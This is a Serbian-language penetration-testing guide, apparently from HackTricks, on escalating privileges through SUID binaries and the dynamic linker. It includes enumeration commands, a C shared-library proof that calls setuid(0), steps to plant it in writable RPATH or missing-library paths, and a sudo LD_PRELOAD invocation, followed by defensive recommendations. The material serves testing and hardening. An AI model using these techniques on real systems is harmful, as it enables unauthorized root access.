# Zloupotreba SUID deljenih biblioteka i linkera

{{#include ../../banners/hacktricks-training.md}}

SUID binarni fajlovi se obično proveravaju zbog direktnog izvršavanja komandi, ali prilagođeni SUID programi takođe mogu biti ranjivi kroz dinamički linker. Zajednička karakteristika je jednostavna: privilegovani executable učitava code sa putanje ili iz konfiguracije na koju korisnik sa nižim privilegijama može da utiče.

Ova stranica se fokusira na generičke obrasce tehnika: nedostajuće biblioteke, writable direktorijume biblioteka, `RPATH`/`RUNPATH`, `LD_PRELOAD` kroz sudo, konfiguraciju linkera i zabunu sa SUID hardlinkovima.

## Brza enumeracija

Počnite pronalaženjem neuobičajenih SUID fajlova i proverom da li su dinamički linkovani:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Fokusirajte se na nestandardne lokacije, prilagođene putanje aplikacija, binarne datoteke čiji je vlasnik root, ali se nalaze izvan direktorijuma kojima upravljaju paketi, kao i na dependencies učitane iz direktorijuma u koje je moguće upisivati.

Korisne provere mogućnosti upisivanja:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Neki prilagođeni SUID binarni fajlovi pokušavaju da učitaju shared object koji ne postoji. Ako se putanja koja nedostaje nalazi u direktorijumu kojim upravlja attacker, binarni fajl može učitati code koji je attacker dostavio, kao effective user.

Pronađite neuspešna traženja library-ja:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Ako binary traži `libexample.so` na writable putanji, minimalna proof library može da koristi constructor. Tokom validacije, proof-of-impact treba da ostane bezopasan:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Izgradite ga koristeći tačan naziv datoteke koju binary pokušava da učita:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Eksploatabilni uslov nije samo biblioteka koja nedostaje. Napadač mora moći da postavi kompatibilni shared object na putanju koju će privilegovani loader prihvatiti.

## Upisivi direktorijum biblioteka

Ponekad sve zavisnosti postoje, ali je jedan od direktorijuma koji se koriste za njihovo razrešavanje upisiv. To može omogućiti zamenu učitane biblioteke ili postavljanje biblioteke višeg prioriteta sa istim imenom.

Pregledajte putanje zavisnosti:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Ako je direktorijum upisiv, proverite to pristupom bezbednim za kopiranje u laboratoriji. Zamena sistemskih biblioteka na aktivnom hostu može da pokvari autentikaciju, upravljanje paketima ili servise kritične za pokretanje sistema.

## RPATH i RUNPATH

`RPATH` i `RUNPATH` su stavke dinamičkog odeljka koje loaderu govore gde da traži biblioteke. Opasne su u SUID programima kada upućuju na direktorijume u koje attacker može da upisuje.

Detektujte ih:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Primer rizičnog izlaza:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Ako je `/opt/app/lib` upisiv i binarni fajl zahteva `libcustom.so`, napadač možda može tamo da postavi zlonamerni `libcustom.so`:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` i `RUNPATH` nisu identični u svim detaljima rezolucije, ali je za proveru privilege-escalation praktično pitanje isto: da li SUID binary pretražuje direktorijum u koji attacker može da upisuje, tražeći ime library-ja?

## LD_PRELOAD, LD_LIBRARY_PATH i SUID

Kod normalnih programa, `LD_PRELOAD` i `LD_LIBRARY_PATH` mogu da prisile ili utiču na učitavanje shared object-a. Kod SUID programa, dynamic loader se obično prebacuje u secure-execution mode i ignoriše opasne environment variables.

To znači da običan SUID binary obično nije ranjiv samo zato što korisnik može da postavi `LD_PRELOAD`:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Uobičajeni izuzetak je pogrešna konfiguracija sudo-a. Ako `sudo -l` pokaže da je promenljiva kao što je `LD_PRELOAD` ili `LD_LIBRARY_PATH` očuvana, komanda dozvoljena kroz sudo može učitati kod pod kontrolom napadača:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Ne mešajte ove slučajeve:

- `LD_PRELOAD` protiv normalnog SUID binary-ja: secure execution ga obično blokira.
- `LD_PRELOAD` koji sudo zadržava: potencijalno exploitable.
- Nedostajući `.so` u writable path-u: exploitable kada SUID binary prirodno učitava taj path.
- `RPATH`/`RUNPATH` ka writable directory-ju: exploitable kada je moguće kontrolisati potrebnu library.
- Pristup za upis u `/etc/ld.so.preload` ili linker config: sistemski i visokog uticaja.

## Konfiguracija linkera

Dynamic linker takođe čita sistemsku konfiguraciju kao što su `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, linker cache i, u nekim slučajevima, `/etc/ld.so.preload`.

Najvažnije provere:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration is usually more serious than a single vulnerable SUID binary because it can affect many dynamically linked processes. `/etc/ld.so.preload` is especially dangerous because it can force a shared object into privileged processes.

## SUID Hardlink Confusion

Hardlinks can make the same SUID inode appear under multiple names. This is useful for hiding a privileged helper, confusing cleanup, or bypassing naive path-based review.

Pronađite SUID files sa više od jednog linka:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Pregledajte sve putanje do istog inode-a:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Zloupotreba nije u tome što hardlink menja dozvole. Zloupotreba je zabuna putanje: privilegovani inode može biti dostupan kroz naziv koji defenderi ili skripte ne očekuju. Za detaljniji workflow inode-a i hardlink-a pogledajte [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Defanzivne napomene

- Održavajte SUID binaries minimalnim, auditovanim i, gde je moguće, pod upravljanjem package manager-a.
- Izbegavajte `RPATH`/`RUNPATH` unose koji pokazuju na direktorijume u koje korisnici mogu da upisuju ili kojima upravlja aplikacija.
- Održavajte direktorijume biblioteka u vlasništvu root-a i bez dozvole upisa za standardne korisnike.
- Ne zadržavajte `LD_PRELOAD`, `LD_LIBRARY_PATH` ili slične loader promenljive kroz sudo.
- Nadgledajte `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` i neočekivane SUID datoteke.
- Pregledajte SUID datoteke sa hardlink-ovima i istražite prilagođene SUID wrappers izvan standardnih sistemskih putanja.

{{#include ../../banners/hacktricks-training.md}}
